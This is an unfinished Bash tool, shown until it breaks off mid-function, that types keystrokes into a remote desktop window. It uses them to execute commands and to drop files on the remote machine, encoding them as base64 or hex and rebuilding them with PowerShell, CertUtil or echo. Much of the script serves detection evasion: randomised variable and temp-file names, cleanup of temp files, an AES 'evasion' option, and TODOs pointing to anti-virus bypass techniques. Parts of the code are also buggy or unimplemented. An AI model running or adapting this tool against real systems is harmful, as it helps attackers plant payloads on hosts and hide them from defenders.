#!/usr/bin/env bash

set -euo pipefail

BLUE="\033[1;34m"
GREEN="\033[1;32m"
RED="\033[1;31m"
YELLOW="\033[1;33m"
RESET="\033[0m"

OPTIONS=""
LONG_OPTIONS=""
PARSED_OPTIONS=$(getopt -o "${OPTIONS}" -l "${LONG_OPTIONS}" -n "$(basename "${0}")" -- "${@}")

function check_program() {
    type -P "${1}" 2>/dev/null
}

function print() {
    local text="${1}"

    echo -e "${text}"
}

function info() {
    local message="${1}"
    local color="${BLUE}[*]${RESET}"

    print "${color} ${message}"
}

function finish() {
    local message="${1}"
    local color="${GREEN}[*]${RESET}"

    print "${color} ${message}"
}

function warn() {
    local message="${1}"
    local color="${YELLOW}[*]${RESET}"

    print "${color} ${message}"
}

function error() {
    local message="${1}"
    local color="${RED}[*]${RESET}"

    print "${color} ${message}"
}

function quit() {
    local code="${1}"

    ((code != 0)) && info "Terminating program..."
    exit "${1}"
}

function check_dependencies() {
    local -a programs=("remmina" "getopt")
    local -a missing=()

    if [[ "${XDG_SESSION_TYPE}" == "x11" ]]
    then
        programs+=("xdotool")
        programs+=("xfreerdp")
    fi

    for program in "${programs[@]}"
    do
        if [[ $(check_program "${program}") ]]
        then
            if [[ "${program}" == "getopt" ]]
            then
                missing+=("util-linux")
            else
                missing+=("${program}")
            fi
        fi
    done

    if ((${#missing[@]} > 0))
    then
        error "Required dependencies: ${missing[*]}"
    fi
}

function get_window_name() {
    xdotool search --name "${WINDOWNAME}" getwindowname
    return ${?}
}

function keyboard() {
    local input="${1}"
    local key="${2}"

    if [[ "${XDG_SESSION_TYPE}" == "x11" ]]
    then
        case "${key}" in
            "keystrokes")
                xdotool search --name "${WINDOWNAME}" windowactivate type "${input}"
                ;;
            "escape_keystrokes")
                xdotool search --name "${WINDOWNAME}" windowactivate type -- "${input}"
                ;;
            "custom_keystroke")
                xdotool search --name "${WINDOWNAME}" windowactivate key "${input}"
                ;;
        esac
    elif [[ "${XDG_SESSION_TYPE}" == "wayland" ]]
    then
        error "Wayland isn't supported!"
    fi
}

function count_lines() {
    wc -l < "${1}" 2>/dev/null
}
# TODO: Fill these execution methods in SCPA notes "searchbox" and "dialogbox"
function read_input() {
    local commands="${1}"
    local method="${2}"

    function execute() {
        # TODO: https://github.com/RoseSecurity/Anti-Virus-Evading-Payloads/blob/main/Bypass-AV-Payload-Detection.md
        # Obfuscate linux commands (detect PLATFORM first then) using hex, octal, unicode hex 4, and unicode hex 8
        info "Executing commands..."
        keyboard "${commands}" "escape_keystrokes"
        keyboard "Return" "custom_keystroke"
        finish "Task completed!"
    }

    function read_text_file() {
        local file="${commands}"
        local file_type=$(file -b --mime-encoding "${file}")
        local lines=$(count_lines "${file}")
        local contents

        if [[ "${file_type}" == "binary" ]]
        then
            error "The file must be a text file! Terminating program."
        fi

       info "Executing commands..."
        # If there are zero new lines just read the remaining file's contents.
        if ((lines == 0))
        then
            contents=$(< "${file}")
            keyboard "${contents}" "escape_keystrokes"
            keyboard "Return" "custom_keystroke"
        else
            while read -r line
            do
                keyboard "${line}" "escape_keystrokes"
                keyboard "Return" "custom_keystroke"
            done < "${file}"
        fi
        finish "Task completed!"
    }

    function search_box() {
        if [[ "${PLATFORM}" != "windows" ]]
        then
            error "This execution method is only exclusive for windows!"
            quit 1
        fi

        info "Checking one of the lines reaches 400 character limit"
        if ((${#commands} > 400))
        then
            error "Character Limit reached!"
            quit 1
        fi

        info "Executing commands..."
        keyboard "Super+s" "custom_keystroke"
        keyboard "${commands}" "escape_keystrokes"
        keyboard "Return" "custom_keystroke"
        finish "Task completed!"
    }

    function dialogue_box() {
        if [[ "${PLATFORM}" != "windows" ]]
        then
            error "This execution method is only exclusive for windows!"
            quit 1
        fi

        info "Checking one of the lines reaches 260 character limit"
        if ((${#commands} > 260))
        then
            error "Character Limit reached!"
            quit 1
        fi

        info "Executing commands..."
        keyboard "Super+r" "custom_keystroke"
        keyboard "${commands}" "escape_keystrokes"
        keyboard "Return" "custom_keystroke"
        finish "Task completed!"
    }

    case "${method}" in
        "none")
            if [[ ! -f "${commands}" && -n "${commands}" ]]
            then
                execute
            elif [[ -f "${commands}" ]]
            then
                read_text_file
            fi
            ;;
        "searchbox")
            search_box
            ;;
        "dialogbox")
            dialogue_box
            ;;
        *)
            error "Invalid Execution Type!" >&2
            info "Available methods are: none, and dialogbox"
            quit 1
            ;;
    esac
}

function random_string() {
    local -a characters=({a..z} {A..Z} {0..9})
    local length=$((RANDOM % 13 + 8))  # A length of characters between 8 and 20
    local string=""
    local random_index

    for ((i = 0; i < length; i++))
    do
        random_index=$((RANDOM % ${#characters[@]}))
        string+=${characters[$random_index]}
    done

    echo "${string}"
}

: <<-'COMMENT'
There is a limitation with this implementation.
However, it is ideal for uploading files with a specific path.
COMMENT

function directory_name() {
    local filepath="${1}"
    local directory_name
    # Determine the type of slashes used in the path
    if [[ "${filepath}" == *\\* ]]
    then
        # Handle paths with backslashes (Windows style)
        # Special case: if the result is empty, it means the path was something like "C:\file"
        directory_name="${filepath%\\*}"
        if [[ -z "${directory_name}" || "${directory_name}" == "${filepath}" ]]
        then
            echo "."
            return
        fi

        echo "${directory_name}"
    else
        # Handle paths with forward slashes (Unix style)
        if [[ "${filepath}" != */* ]]
        then
            echo "."
            return
        fi

        # Special case: if the result is empty, it means the path was something like "/file"
        directory_name="${filepath%/*}"
        if [[ -z "${directory_name}" || "${directory_name}" == "${filepath}" ]]
        then
            echo "/"
            return
        fi

        echo "${directory_name}"
    fi
}
# TODO: https://devblogs.microsoft.com/scripting/increase-powershell-command-history-to-the-max-almost/
# The maximum length of lines is total of 32768 (lines > 32767) when executing through Windows PowerShell or Windows Terminal.
function upload() {
    local local_file="${1}"
    local remote_file="${2}"
    local method="${3}"
    local submethod="${4}"
    local action="${5}"
    local evasion="${6}"
    local file_type=$(file -b --mime-encoding "${local_file}")
    local lines=$(count_lines "${local_file}")
    local -a encoded=()
    local counter
    local directory_path=$(directory_name "${remote_file}")
    local temporary_file=$(random_string)
    local data
    local chunks
    local temp

    function _base64() {
        local mode="${1}"
        local action="${2}"
        local random_variable_one=$(random_string)
        local random_variable_two=$(random_string)
        chunks=100

        # TODO: -a, --action or just -s, --submethod instead because --action is redundant
        # -s, --submethod <none | legacy | openssl>
        # -a, --action <none | info | compression>
        # -e, --evasion <none | aes256>

        # TODO: Implement encryption method through base64 with -e,--evasion flag
        # $ rks -i file -o output --method pwshb64 --submethod none --action compression
        # $ iconv -t UTF-16LE file.txt | gzip | basenc -w 0 --base64
        # $ gzip -c file.exe | basenc -w 0 --base64
        # To decode it
        # basenc --base64 -d <<< $data | gzip -d > file.exe

        # For just base64 'legacy' and compressed with gzip
        # $ rks -i file -o output --method pwshb64 --submethod legacy --action compression
        # To decode it
        # base64 -d <<< $data | gzip -d > file.exe

        # For just 'openssl' without encryption
        # $ rks -i file -o output -m pwshb64 --submethod openssl --evasion none
        # $ iconv -t UTF-16LE file.txt | openssl enc -a -e -A
        # $ openssl enc -a -e -A -in file.exe

        # For just 'openssl' without encryption and compressed with gzip
        # $ rks -i file -o output -m pwshb64 --submethod openssl --action compression
        # $ iconv -t UTF-16LE file.txt | gzip | openssl enc -a -e -A
        # $ gzip -c file.exe | openssl enc -a -e -A

        # $ rks -i file -o output -m pwshb64 --submethod openssl --evasion aes256
        # To encode and encrypt it with AES
        # $ iconv -t UTF-16LE file.txt | gzip | openssl enc -a -e -A
        # $ gzip -c file.exe | openssl enc -a -e -A

        if [[ ("${PLATFORM}" == "windows" || "${PLATFORM}" == "linux") && "${mode}" == "powershell" ]]
        then
            if [[ "${file_type}" == "binary" ]]
            then
                data=$(basenc -w 0 --base64 "${local_file}")
            else
                data=$(iconv -f ASCII -t UTF-16LE "${local_file}" | basenc -w 0 --base64)
            fi

            info "Transferring file..."

            for ((i = 0; i < ${#data}; i += chunks))
            do
                if ((i == 0))
                then
                    keyboard "\$${random_variable_one} = \"${data:i:chunks}\"" "keystrokes"
                    keyboard "Return" "custom_keystroke"
                else
                    keyboard "\$${random_variable_one} += \"${data:i:chunks}\"" "keystrokes"
                    keyboard "Return" "custom_keystroke"
                fi
            done
            # TODO: and make a VARIANT either none or one-liner
            keyboard "[byte[]]\$${random_variable_two} = [Convert]::FromBase64String(\$${random_variable_one})" "keystrokes"
            keyboard "Return" "custom_keystroke"
            keyboard "[IO.File]::WriteAllBytes(\"${remote_file}\", \$${random_variable_two})" "keystrokes"
            keyboard "Return" "custom_keystroke"

            finish "File transferred!"
        elif [[ "${PLATFORM}" == "linux" && "${mode}" == "console" ]]
        then
            if [[ "${action}" == "compression" ]]
            then
                if [[ "${evasion}" == "aes256" ]]
                then
                    data=$(openssl -in "${local_file}" | gzip -c | basenc -w 0 --base64)
                else
                    data=$(gzip -c "${local_file}" | basenc -w 0 --base64)
                fi
            else
                if [[ "${evasion}" == "aes256" ]]
                then
                    data=$(openssl -in "${local_file}" | basenc -w 0 --base64)
                else
                    data=$(basenc -w 0 --base64 "${local_file}")
                fi
            fi
            data=$(basenc -w 0 --base64 "${local_file}")

            info "Transferring file..."

            for ((i = 0; i < ${#data}; i += chunks))
            do
                if ((i == 0))
                then
                    keyboard "${random_variable_one}=\"${data:i:chunks}\"" "keystrokes"
                    keyboard "Return" "custom_keystroke"
                else
                    keyboard "${random_variable_one}+=\"${data:i:chunks}\"" "keystrokes"
                    keyboard "Return" "custom_keystroke"
                fi
            done

            if [[ "${submethod}" == "none" ]]
            then
                if [[ "${action}" == "none" ]]
                then
                    keyboard "basenc -d --base64 <<< \$${random_variable} > \"${remote_file}\"" "keystrokes"
                elif [[ "${action}" == "compression" ]]
                then
                    keyboard "basenc -d --base64 <<< \$${random_variable} | gzip -d > \"${remote_file}\"" "keystrokes"
                fi
            elif [[ "${submethod}" == "legacy" ]]
            then
                if [[ "${action}" == "none" ]]
                then
                    keyboard "base64 -d <<< \$${random_variable} > \"${remote_file}\"" "keystrokes"
                elif [[ "${action}" == "compression" ]]
                then
                    keyboard "base64 -d <<< \$${random_variable} | gzip -d > \"${remote_file}\"" "keystrokes"
                fi
            fi
            keyboard "Return" "custom_keystroke"
            finish "File transferred!"
        fi
    }

    function _base32() {
        local mode="${1}"
        local random_variable=$(random_string)
        chunks=100

        if [[ "${PLATFORM}" != "linux" ]]
        then
            error "This execution method is only exclusive for linux!"
            quit 1
        fi
        # TODO: Finish the openssl encryption implementation
        if [[ "${mode}" == "console" ]]
       	then
            if [[ "${action}" == "compression" ]]
            then
                if [[ "${evasion}" == "aes256" ]]
                then
                    data=$(openssl -in "${local_file}" | gzip -c | basenc -w 0 --base32)
                else
                    data=$(gzip -c "${local_file}" | basenc -w 0 --base32)
                fi
            else
                if [[ "${evasion}" == "aes256" ]]
                then
                    data=$(openssl -in "${local_file}" | basenc -w 0 --base32)
                else
                    data=$(basenc -w 0 --base32 "${local_file}")
                fi
            fi
            info "Transferring file..."

            # Split a pair of characters and make it into a hexadecimal format.
            for ((i = 0; i < ${#data}; i += 2))
            do
                temp+="\\x${data:i:2}"
            done

            for ((i = 0; i < ${#temp}; i += chunks))
            do
                if ((i == 0))
                then
                    keyboard "${random_variable}=\"${temp:i:chunks}\"" "keystrokes"
                    keyboard "Return" "custom_keystroke"
                else
                    keyboard "${random_variable}+=\"${temp:i:chunks}\"" "keystrokes"
                    keyboard "Return" "custom_keystroke"
                fi
            done

            if [[ "${submethod}" == "none" ]]
            then
                if [[ "${action}" == "none" ]]
                then
                    keyboard "basenc -d --base32 <<< \$${random_variable} > \"${remote_file}\"" "keystrokes"
                elif [[ "${action}" == "compression" ]]
                then
                    keyboard "basenc -d --base32 <<< \$${random_variable} | gzip -d > \"${remote_file}\"" "keystrokes"
                fi
            elif [[ "${submethod}" == "legacy" ]]
            then
                if [[ "${action}" == "none" ]]
                then
                    keyboard "base32 -d <<< \$${random_variable} > \"${remote_file}\"" "keystrokes"
                elif [[ "${action}" == "compression" ]]
                then
                    keyboard "base32 -d <<< \$${random_variable} | gzip -d > \"${remote_file}\"" "keystrokes"
                fi
            fi
            keyboard "Return" "custom_keystroke"
       	fi
        finish "File transferred!"
    }

    function base32hex() {
        local mode="${1}"
        local random_variable=$(random_string)
        chunks=100

        if [[ "${PLATFORM}" != "linux" ]]
        then
            error "This execution method is only exclusive for linux!"
            quit 1
        fi

        if [[ "${mode}" == "console" ]]
       	then
            data=$(basenc -w 0 --base32hex "${local_file}")
            info "Transferring file..."

            # Split a pair of characters and make it into a hexadecimal format.
            for ((i = 0; i < ${#data}; i += 2))
            do
                temp+="\\x${data:i:2}"
            done

            for ((i = 0; i < ${#temp}; i += chunks))
            do
                if ((i == 0))
                then
                    keyboard "${random_variable}=\"${temp:i:chunks}\"" "keystrokes"
                    keyboard "Return" "custom_keystroke"
                else
                    keyboard "${random_variable}+=\"${temp:i:chunks}\"" "keystrokes"
                    keyboard "Return" "custom_keystroke"
                fi
            done

            if [[ "${submethod}" == "none" ]]
            then
                if [[ "${action}" == "none" ]]
                then
                    keyboard "basenc -d --base32hex <<< \$${random_variable} > \"${remote_file}\"" "keystrokes"
                elif [[ "${action}" == "compression" ]]
                then
                    keyboard "basenc -d --base32hex <<< \$${random_variable} | gzip -d > \"${remote_file}\"" "keystrokes"
                fi
            fi

            keyboard "Return" "custom_keystroke"
       	fi
        finish "File transferred!"
    }
    # Using hexadecimal to encode files
    function base16() {
        local mode="${1}"
        local random_variable=$(random_string)
        data=$(basenc -w 0 --base16 "${local_file}")
        chunks=100

        if [[ "${PLATFORM}" != "windows" && "${PLATFORM}" != "linux" ]]
        then
            error "Only both linux and windows are supported for this method!"
            quit 1
        fi

       	if [[ "${mode}" == "powershell" ]]
       	then
            info "Transferring file..."

            for (( i = 0; i < ${#data}; i += chunks ))
            do
                if (( i == 0 ))
                then
                    keyboard "\$${random_variable} = \"${data:i:chunks}\"" "keystrokes"
                    keyboard "Return" "custom_keystroke"
                else
                    keyboard "\$${random_variable} += \"${data:i:chunks}\"" "keystrokes"
                    keyboard "Return" "custom_keystroke"
                fi
            done

            if [[ "${submethod}" == "none" ]]
            then
                if [[ "${action}" == "none" ]]
                then
                    keyboard "[IO.File]::WriteAllBytes(\"${remote_file}\", (\$${random_variable} -split '(.{2})' | Where-Object { \$_ -ne '' } | ForEach-Object { [Convert]::ToByte(\$_, 16) }))" "keystrokes"
                elif [[ "${action}" == "compression" ]] # TODO: Add compression for the powershell cmdlet
                then
                    keyboard "basenc -d --base32hex <<< \$${random_variable} | gzip -d > \"${remote_file}\"" "keystrokes"
                fi
            elif [[ "${submethod}" == "none" ]] # TODO: Add certutil to decode hexadecimal bytes as a submethod and check the code
            then
                if [[ "${action}" == "none" ]]
                then
                    keyboard "echo %${random_variable}% > \"${directory_path}\\${temporary_file}.hex\"" "keystrokes"
                    keyboard "Return" "custom_keystroke"
                    keyboard "CertUtil.exe -f -decodehex \"${directory_path}\\${temporary_file}.hex\" \"${remote_file}\" 12" "keystrokes"
                    keyboard "Return" "custom_keystroke"
                    keyboard "del /f \"${directory_path}\\${temporary_file}.hex\"" "keystrokes"
                else # TODO: This must start from top if the submethod or action is not defined then it must list the available options
                    error ""
                    quit 1
                fi
            fi
            keyboard "Return" "custom_keystroke"
        elif [[ "${mode}" == "certutil" ]]
        then
            if [[ "${PLATFORM}" != "windows" ]]
            then
                error "This method is only exclusive for windows!"
                info "Use 'nixhex' as a method instead."
                quit 1
            fi

            # TODO: Make an if statement of limited characters or lines using batch variable via command prompt
            # The maximum length of the string that you can use at the command prompt is 8191 characters.
            # https://learn.microsoft.com/en-us/troubleshoot/windows-client/shell-experience/command-line-string-limitation
            info "Checking 8191 character limit..."
            if ((${#data} > 8191))
            then
                error "Character limit!"
                quit 1
            fi

            info "Transferring file..."

            # Appends the hexadecimal data in a batch file
            for ((i = 0; i < ${#data}; i += chunks))
            do
                if ((i == 0))
                then
                    keyboard "set ${random_variable}=${data:i:chunks}" "keystrokes"
                    keyboard "Return" "custom_keystroke"
                else
                    keyboard "set ${random_variable}=%${random_variable}%${data:i:chunks}" "keystrokes"
                    keyboard "Return" "custom_keystroke"
                fi
            done

            keyboard "echo %${random_variable}% > \"${directory_path}\\${temporary_file}.hex\"" "keystrokes"
            keyboard "Return" "custom_keystroke"
            keyboard "CertUtil.exe -f -decodehex \"${directory_path}\\${temporary_file}.hex\" \"${remote_file}\" 12" "keystrokes"
            keyboard "Return" "custom_keystroke"
            keyboard "del /f \"${directory_path}\\${temporary_file}.hex\"" "keystrokes"
            keyboard "Return" "custom_keystroke"
       	elif [[ "${mode}" == "console" ]]
       	then
            info "Transferring file..."

            # Split a pair of characters and make it into a hexadecimal format.
            for ((i = 0; i < ${#data}; i += 2))
            do
                temp+="\\x${data:i:2}"
            done

            for ((i = 0; i < ${#temp}; i += chunks))
            do
                if ((i == 0))
                then
                    keyboard "${random_variable}=\"${temp:i:chunks}\"" "keystrokes"
                    keyboard "Return" "custom_keystroke"
                else
                    keyboard "${random_variable}+=\"${temp:i:chunks}\"" "keystrokes"
                    keyboard "Return" "custom_keystroke"
                fi
            done
            # Interpret the backslash to output into a file.
            keyboard "echo -en \$${random_variable} > \"${remote_file}\"" "keystrokes"
            keyboard "Return" "custom_keystroke"
       	fi
        finish "File transferred!"
    }
    # Using binary digits of 1 and 0
    # to encode files with each 8 bits of size
    function base2() {
        local mode="${1}"
        local action="${2}"
        local random_variable=$(random_string)
        data=$(basenc -w 0 --base2msbf "${local_file}")
        chunks=100

        if [[ "${PLATFORM}" != "windows" && "${PLATFORM}" != "linux" ]]
        then
            error "Only both linux and windows are supported for this method!"
            quit 1
        fi

        # TODO: Implement this feature for both linux and powershell cmdlet
        echo "not yet implemented"

       	if [[ "${mode}" == "powershell" ]]
       	then
            info "Transferring file..."

            for ((i = 0; i < ${#data}; i += chunks))
            do
                if ((i == 0))
                then
                    keyboard "\$${random_variable} = \"${data:i:chunks}\"" "keystrokes"
                    keyboard "Return" "custom_keystroke"
                else
                    keyboard "\$${random_variable} += \"${data:i:chunks}\"" "keystrokes"
                    keyboard "Return" "custom_keystroke"
                fi
            done

            # TODO: and make a VARIANT either none or one-liner
            keyboard "[IO.File]::WriteAllBytes(\"${remote_file}\", (\$${random_variable} -split '(.{2})' | Where-Object { \$_ -ne '' } | ForEach-Object { [Convert]::ToByte(\$_, 16) }))" "keystrokes"
            keyboard "Return" "custom_keystroke"
       	elif [[ "${mode}" == "console" ]]
       	then
            info "Transferring file..."

            # Split a pair of characters and make it into a hexadecimal format.
            for ((i = 0; i < ${#data}; i += 2))
            do
                temp+="\\x${data:i:2}"
            done

            for ((i = 0; i < ${#temp}; i += chunks))
            do
                if ((i == 0))
                then
                    keyboard "${random_variable}=\"${temp:i:chunks}\"" "keystrokes"
                    keyboard "Return" "custom_keystroke"
                else
                    keyboard "${random_variable}+=\"${temp:i:chunks}\"" "keystrokes"
                    keyboard "Return" "custom_keystroke"
                fi
            done
            # Interpret the backslash to output into a file.
            keyboard "echo -en \$${random_variable} > \"${remote_file}\"" "keystrokes"
            keyboard "Return" "custom_keystroke"
       	fi
        finish "File transferred!"
    }
    # Using decimals to encode files
    function base10() {
        local mode="${1}"
        local action="${2}"
        local random_variable=$(random_string)
        chunks=100

        # TODO: Implement this feature for both linux and powershell cmdlet
        # $ printf
        echo "not yet implemented"
        if [[ -f "${local_file}" ]]
        then
        	if [[ "${mode}" == "powershell" ]]
        	then
                info "Transferring file..."

            for ((i = 0; i < ${#data}; i += chunks))
            do
                if ((i == 0))
                then
                    keyboard "\$${random_variable} = \"${data:i:chunks}\"" "keystrokes"
                    keyboard "Return" "custom_keystroke"
                else
                    keyboard "\$${random_variable} += \"${data:i:chunks}\"" "keystrokes"
                    keyboard "Return" "custom_keystroke"
                fi
            done
                # TODO: Change this from binary to decimal
                # and make a VARIANT either none or one-liner
                keyboard "[IO.File]::WriteAllBytes(\"${remote_file}\", (\$${random_variable} -split '(.{2})' | Where-Object { \$_ -ne '' } | ForEach-Object { [Convert]::ToByte(\$_, 16) }))" "keystrokes"
                keyboard "Return" "custom_keystroke"
        	elif [[ "${mode}" == "console" ]]
        	then
                info "Transferring file..."

                # TODO: Change this from binary to decimal
                # Split a pair of characters and make it into a hexadecimal format.
                for ((i = 0; i < ${#data}; i += 2))
                do
                    temp+="\\x${data:i:2}"
                done

                for (( i = 0; i < ${#temp}; i += chunks))
                do
                    if ((i == 0))
                    then
                        keyboard "${random_variable}=\"${temp:i:chunks}\"" "keystrokes"
                        keyboard "Return" "custom_keystroke"
                    else
                        keyboard "${random_variable}+=\"${temp:i:chunks}\"" "keystrokes"
                        keyboard "Return" "custom_keystroke"
                    fi
                done
                # Interpret the backslash to output into a file.
                keyboard "echo -en \$${random_variable} > \"${remote_file}\"" "keystrokes"
                keyboard "Return" "custom_keystroke"
        	fi
            finish "File transferred!"
        fi
    }
    # Using octals to encode files
    function base8() {
        local random_variable=$(random_string)
        chunks=100

        # TODO: Implement this feature for both linux and powershell cmdlet
        # $ od -A n -t o1 -v file.txt | tr -d "[:space:]" (https://github.com/RoseSecurity/Anti-Virus-Evading-Payloads/blob/main/Bypass-AV-Payload-Detection.md)
        echo "not implemented"
        if [[ -f "${local_file}" ]]
        then
        	if [[ "${mode}" == "powershell" ]]
        	then
                info "Transferring file..."

                for ((i = 0; i < ${#data}; i += chunks))
                do
                    if ((i == 0))
                    then
                        keyboard "\$${random_variable} = \"${data:i:chunks}\"" "keystrokes"
                        keyboard "Return" "custom_keystroke"
                    else
                        keyboard "\$${random_variable} += \"${data:i:chunks}\"" "keystrokes"
                        keyboard "Return" "custom_keystroke"
                    fi
                done
                # TODO: and make a VARIANT either none or one-liner
                keyboard "[IO.File]::WriteAllBytes(\"${output_file}\", (\$${random_variable} -split '(.{2})' | Where-Object { \$_ -ne '' } | ForEach-Object { [Convert]::ToByte(\$_, 16) }))" "keystrokes"
                keyboard "Return" "custom_keystroke"
        	elif [[ "${mode}" == "console" ]]
        	then
                info "Transferring file..."

                # Split a pair of characters and make it into a hexadecimal format.
                for ((i = 0; i < ${#data}; i += 2))
                do
                    temp+="\\x${data:i:2}"
                done

                for ((i = 0; i < ${#temp}; i += chunks))
                do
                    if ((i == 0))
                    then
                        keyboard "${random_variable}=\"${temp:i:chunks}\"" "keystrokes"
                        keyboard "Return" "custom_keystroke"
                    else
                        keyboard "${random_variable}+=\"${temp:i:chunks}\"" "keystrokes"
                        keyboard "Return" "custom_keystroke"
                    fi
                done
                # Interpret the backslash to output into a file.
                keyboard "echo -en \$${random_variable} > \"${remote_file}\"" "keystrokes"
                keyboard "Return" "custom_keystroke"
        	fi
            finish "File transferred!"
        fi
    }

    function output_variable() {
        local mode="${1}"
        chunks=100

        if [[ "${PLATFORM}" != "windows" && "${PLATFORM}" != "linux" ]]
        then
            error "Only windows and linux are supported for this method!"
            quit 1
        fi

        if [[ "${mode}" == "text" && "${file_type}" != "binary" ]]
        then
            info "Checking one of the lines reaches 3477 character limit"
            while read -r line
            do
                if ((${#line} == 3477))
                then
                    error "Character Limit reached!"
                    info "Use 'outfileb64' as a method instead."
                    quit 1
                fi
            done < "${local_file}"

            info "Transferring file..."
            keyboard "@'" "escape_keystrokes"
            keyboard "Return" "custom_keystroke"
            while read -r line
            do
                keyboard "${line}" "keystrokes"
                keyboard "Return" "custom_keystroke"
            done < "${local_file}"

            keyboard "'@ | Out-File ${remote_file}" "escape_keystrokes"
            keyboard "Return" "custom_keystroke"
        elif [[ "${mode}" == "text" && "${file_type}" == "binary" ]]
        then
            # TODO: Refactor
            warn "This is a binary file! Switching to 'outfileb64' method instead..."
            output_variable "base64"
            quit 1
        elif [[ "${mode}" == "base64" ]]
        then
            chunks=64

            if [[ "${PLATFORM}" != "windows" ]]
            then
                error "This method is exclusively used for windows because it relies on 'CertUtil.exe'."
                info "Use 'nixb64' method instead."
                quit 1
            fi

            info "Transferring file..."
            data=$(basenc -w 0 --base64 "${local_file}")
            keyboard "@'" "escape_keystrokes"
            keyboard "Return" "custom_keystroke"
            keyboard "-----BEGIN CERTIFICATE-----" "escape_keystrokes"
            keyboard "Return" "custom_keystroke"

            for ((i = 0; i < ${#data}; i += chunks))
            do
                if ((i == 0))
                then
                    keyboard "${data:i:chunks}" "keystrokes"
                    keyboard "Return" "custom_keystroke"
                else
                    keyboard "${data:i:chunks}" "keystrokes"
                    keyboard "Return" "custom_keystroke"
                fi
            done

            keyboard "-----END CERTIFICATE-----" "escape_keystrokes"
            keyboard "Return" "custom_keystroke"
            keyboard "'@ | Out-File \"${directory_path}\\${temporary_file}.txt\"" "escape_keystrokes"
            keyboard "Return" "custom_keystroke"
            keyboard "CertUtil.exe -f -decode \"${directory_path}\\${temporary_file}.txt\" ${remote_file}" "keystrokes"
            keyboard "Return" "custom_keystroke"
            keyboard "Remove-Item -Force \"${directory_path}\\${temporary_file}.txt\"" "keystrokes"
            keyboard "Return" "custom_keystroke"
        elif [[ "${mode}" == "hex" ]]
        then
            info "Transferring file..."
            data=$(basenc -w 0 --base16 "${local_file}")

            # Append the pair of hexadecimal characters in a array
            for ((i = 0; i < ${#data}; i += 2))
            do
               	encoded+=("${data:i:2}")
            done

            keyboard "@'" "escape_keystrokes"
            keyboard "Return" "custom_keystroke"

            counter=0
            for ((i = 0; i < ${#encoded[@]}; i++))
            do
                if ((counter == 7))
                then
                    keyboard "${encoded[i]}" "keystrokes"
                    keyboard "space" "custom_keystroke"
                elif ((counter == 8))
                then
                    keyboard "space" "custom_keystroke"
                    (( counter++ ))
                elif ((counter == 15))
                then
                    keyboard "${encoded[i]}" "keystrokes"
                    keyboard "Return" "custom_keystroke"
                elif ((i == ${#encoded[@]} - 1))
                then
                    keyboard "${encoded[i]}" "keystrokes"
                    keyboard "Return" "custom_keystroke"
                else
                    keyboard "${encoded[i]}" "keystrokes"
                    keyboard "space" "custom_keystroke"
                fi

                if ((counter == 15))
                then
                    counter=0
                else
                    ((counter++))
                fi
            done
            keyboard "'@ | Out-File \"${directory_path}\\${temporary_file}.hex\"" "escape_keystrokes"
            keyboard "Return" "custom_keystroke"
            keyboard "CertUtil.exe -f -decodehex \"${directory_path}\\${temporary_file}.hex\" \"${remote_file}\" 4" "keystrokes"
            keyboard "Return" "custom_keystroke"
            keyboard "Remove-Item -Force \"${directory_path}\\${temporary_file}.hex\"" "keystrokes"
            keyboard "Return" "custom_keystroke"
        elif [[ "${mode}" == "console" ]]
        then
            # TODO: Test it.
            if [[ "${PLATFORM}" != "linux" ]]
            then
                error "This method is exclusively used for unix because it relies on 'echo'."
                info "Use 'outfile' method instead."
                quit 1
            fi

            info "Transferring file..."
            # TODO: Add this in the if statement for the first line.
            # echo "inserting lines...
            keyboard "echo \"" "escape_keystrokes"
            keyboard "Return" "custom_keystroke"

            counter=1
            while read -r line
            do
                if ((counter != lines))
                then
                    keyboard "${line}" "escape_keystrokes"
                    keyboard "Return" "custom_keystroke"
                else
                    keyboard "${line}\" > ${remote_file}" "escape_keystrokes"
                    keyboard "Return" "custom_keystroke"
                fi
                ((counter++))
            done < "${local_file}"

        elif [[ "${mode}" == "consoleb64" ]]
        then
            # TODO: Test it.
            chunks=64
            if [[ "${PLATFORM}" != "linux" ]]
            then
                error "This method is exclusively used for unix because it relies on 'echo'."
                info "Use 'outfileb64' method instead."
                quit 1
            fi

            info "Transferring file..."
            data=$(basenc -w 0 --base64 "${local_file}")
            # TODO: Add this in the if statement for the first line.
            # echo "inserting lines...
            keyboard "echo \"" "escape_keystrokes"
            keyboard "Return" "custom_keystroke"

            for ((i = 0; i < ${#data}; i += chunks))
            do
                if ((i == 0))
                then
                    keyboard "${data:i:chunks}" "escape_keystrokes"
                    keyboard "Return" "custom_keystroke"
                else
                    keyboard "${data:i:chunks}\" > ${remote_file}" "escape_keystrokes"
                    keyboard "Return" "custom_keystroke"
                fi
            done
            # TODO: Add a flag for legacy -s,--submethod command "base64 -d -w 0"
            keyboard "basenc -w 0 -d --base64 \"${directory_path}/${temporary_file}.txt\" > \"${remote_file}\"" "escape_keystrokes"
            keyboard "Return" "custom_keystroke"
            keyboard "rm -f \"${directory_path}\\${temporary_file}.txt\"" "escape_keystrokes"
            keyboard "Return" "custom_keystroke"
        fi

        finish "File transferred!"
    }

    function copy_con() {
        local mode="${1}"

        if [[ "${PLATFORM}" != "windows" ]]
        then
            error "copycon only exists on Windows operating system!"
            info "Use 'pwshb64' method instead."
            quit 1
        fi

        if [[ "${mode}" == "text" ]]
        then
            info "Checking one of the lines reaches 255 character limit"
            while read -r line
            do
                if ((${#line} == 255))
                then
                    error "Character Limit reached!"
                    info "Use 'cmdb64' as a method instead."
                    quit 1
                fi
            done < "${local_file}"

            info "Transferring file..."
            keyboard "copy con /y ${remote_file}" "keystrokes"
            keyboard "Return" "custom_keystroke"

            counter=1
            while read -r line
            do
                if ((counter != lines))
                then
                    keyboard "${line}" "escape_keystrokes"
                    keyboard "Return" "custom_keystroke"
                else
                    keyboard "${line}" "escape_keystrokes"
                    keyboard "Ctrl+Z" "custom_keystroke"
                    keyboard "Return" "custom_keystroke"
                fi
                ((counter++))
            done < "${local_file}"
        elif [[ "${mode}" == "base64" ]]
        then
            chunks=64
            if [[ "${file_type}" == "binary" ]]
            then
                data=$(basenc -w 0 --base64 "${local_file}")
            else
                data=$(iconv -f ASCII -t UTF-16LE "${local_file}" | basenc -w 0 --base64)
            fi

            info "Transferring file..."
            keyboard "copy con /y \"${directory_path}\\${temporary_file}.txt\"" "keystrokes"
            keyboard "Return" "custom_keystroke"
            keyboard "-----BEGIN CERTIFICATE-----" "escape_keystrokes"
            keyboard "Return" "custom_keystroke"

            for ((i = 0; i < ${#data}; i += chunks))
            do
                if ((i == 0))
                then
                    keyboard "${data:i:chunks}" "keystrokes"
